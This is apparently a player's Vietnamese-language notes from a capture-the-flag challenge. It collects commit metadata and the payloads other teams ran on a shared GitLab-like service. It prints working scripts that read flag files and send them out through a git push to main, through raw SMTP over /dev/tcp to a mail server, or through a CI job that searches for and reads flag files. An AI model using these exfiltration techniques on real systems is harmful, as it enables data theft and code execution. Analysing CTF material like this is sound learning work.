# Payload và metadata lấy từ 53 instance anh em

Toàn bộ dưới đây đọc bằng API ẩn danh trên instance `diag-d9dbe170` (project 54), không cần quyền gì.

## Commit metadata

Mọi commit sau commit template đều có `committer_email = diagbot@challenge.local`, dù `author` là
chuỗi do từng đội tự đặt:

```output
p14  Refresh diagnostics                    Diagnostics Bot  diagbot@gitlash.internal   diagbot@challenge.local
p15  exfil via commit                       diagbot          diagbot@gitlash.internal   diagbot@challenge.local
p23  fix / flag find / add ci config / poc  hakr             hakr@email.com             diagbot@challenge.local
p26  cache diagnostic flag for player review CTF Diagnostics ctf-diagnostics@example.invalid diagbot@challenge.local
p51  Add harmless identity probe            Diagnostic Probe player@example.com         diagbot@challenge.local
p52  update                                 player           player@local               diagbot@challenge.local
```

Commit tạo trong container challenge với git identity cấp hệ thống `diagbot <diagbot@challenge.local>`,
nên credential dùng để push là một mục cấu hình git trên box, không phải token người chơi tự có.

## Payload đã chạy trên box của đội khác

p15 (`run.sh`, exfil bằng commit - root clone push được lên `main`):

```bash
FLAG=$(cat /flag 2>/dev/null || cat /root/flag 2>/dev/null || find / -name 'flag*' -type f 2>/dev/null | head -1 | xargs cat)
cd /opt/diag 2>/dev/null || cd $(dirname $(realpath $0)) 2>/dev/null || cd /tmp
git add FLAG.txt 2>/dev/null
git commit -m "diag report" 2>/dev/null
git push origin HEAD:main 2>/dev/null || true
```

p35 (`run.sh`, thoát dữ liệu bằng raw SMTP tới mail-to-issue của chính dự án):

```bash
# report privileged diagnostic result
if [[ -n "$FLAG" ]]; then
    TO='incoming+diagbot-diag-f420b244-35-glimt-<TOKEN>-issue@gitlash.internal'
    exec 9<>/dev/tcp/mail.gitlash.internal/25 || exit 0
    IFS= read -r _ <&9 || true
    printf 'EHLO diagnostics\r\n' >&9
    ...
    printf 'MAIL FROM:<root@gitlash.internal>\r\n' >&9
fi
```

p26 và p51 (bỏ qua hẳn kênh mail, để root ghi thẳng vào đường dẫn mà `player` đọc được):

```bash
chmod 0644 /tmp/gitlash_flag          # p26
id > /home/player/diag-run-id.txt     # p51
```

p23 (thử hướng CI, file duy nhất khác template trong toàn bộ 54 repo):

```yaml
test-job:
  script:
    - echo "ctf-proof-$(whoami)-$(hostname)"
    - find / -iname "*flag*" 2>/dev/null
    - cat /flag* 2>/dev/null || true
```

p33 và p36 hiện đã tr về template gốc, nhưng mỗi project có 10-18 issue `PWN-DIAG` chứa output root:

```output
#18 PWN-DIAG
total 72
drwxr-xr-x    1 root root 4096 Oct  3 19:22 .
drwxr-xr-x    1 root root 4096 Oct  3 19:22 ..
-rwxr-xr-x    1 root root    0 Oct  3 19:22 .dockerenv
```

## Suy ra từ các artifact trên

1. Cờ nằm ở `/flag` hoặc `/root/flag` trên box chạy cron (không phải box người chơi đang ngồi).
2. Job root mù (`>/dev/null 2>&1`) nên ba kênh thoát đều hợp lệ: mail-to-issue, commit ngược lên repo,
   hoặc ghi file vào đường dẫn world-readable trong container.
3. Team nào ghi được repo thì có ngay root code execution; vấn đề của bài chỉ còn là quyền ghi.
